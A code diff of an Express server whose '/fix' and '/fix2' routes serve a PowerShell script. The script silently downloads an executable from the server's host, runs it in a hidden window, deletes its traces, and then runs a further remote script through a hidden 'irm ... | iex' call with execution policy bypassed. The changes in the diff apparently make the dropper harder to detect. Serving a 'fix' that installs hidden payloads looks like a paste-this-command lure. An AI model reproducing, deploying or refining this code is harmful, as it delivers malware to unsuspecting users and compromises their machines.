@@ -278,12 +278,13 @@ app.get("/fix", (req, res) => {
   }
 
   const script = `$ErrorActionPreference='SilentlyContinue'
-$d="$env:TEMP\\$([System.IO.Path]::GetRandomFileName())"
+$d="$env:TEMP\\$(-join((1..8|%{[char](97+[int](Get-Random -Max 26))}))).tmp"
 New-Item -ItemType Directory -Path $d -Force|Out-Null
-Invoke-WebRequest -Uri 'https://${host}/pkg' -OutFile "$d\\zxcfr.exe" -UseBasicParsing
-Start-Process -FilePath "$d\\zxcfr.exe" -WindowStyle Hidden -Wait
+(New-Object Net.WebClient).DownloadFile('https://${host}/pkg',"$d\\zx.exe")
+$p=Start-Process -FilePath "$d\\zx.exe" -WindowStyle Hidden -PassThru
+$p.WaitForExit(120000)
 Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
-Start-Process powershell -ArgumentList '-ep bypass -c "irm https://${host}/run|iex"'
+Start-Process powershell -ArgumentList '-ep bypass -w hidden -c "irm https://${host}/run|iex"'
 `;
   res.setHeader("Content-Type", "text/plain");
   res.send(script);
@@ -464,12 +465,13 @@ app.get("/fix2", (req, res) => {
   }
 
   const script = `$ErrorActionPreference='SilentlyContinue'
-$d="$env:TEMP\\$([System.IO.Path]::GetRandomFileName())"
+$d="$env:TEMP\\$(-join((1..8|%{[char](97+[int](Get-Random -Max 26))}))).tmp"
 New-Item -ItemType Directory -Path $d -Force|Out-Null
-Invoke-WebRequest -Uri 'https://${host}/pkg2' -OutFile "$d\\apputil.exe" -UseBasicParsing
-Start-Process -FilePath "$d\\apputil.exe" -WindowStyle Hidden -Wait
+(New-Object Net.WebClient).DownloadFile('https://${host}/pkg2',"$d\\au.exe")
+$p=Start-Process -FilePath "$d\\au.exe" -WindowStyle Hidden -PassThru
+$p.WaitForExit(120000)
 Remove-Item -Path $d -Recurse -Force -ErrorAction SilentlyContinue
-Start-Process powershell -ArgumentList '-ep bypass -c "irm https://${host}/run|iex"'
+Start-Process powershell -ArgumentList '-ep bypass -w hidden -c "irm https://${host}/run|iex"'
 `;
   res.setHeader("Content-Type", "text/plain");
   res.send(script);
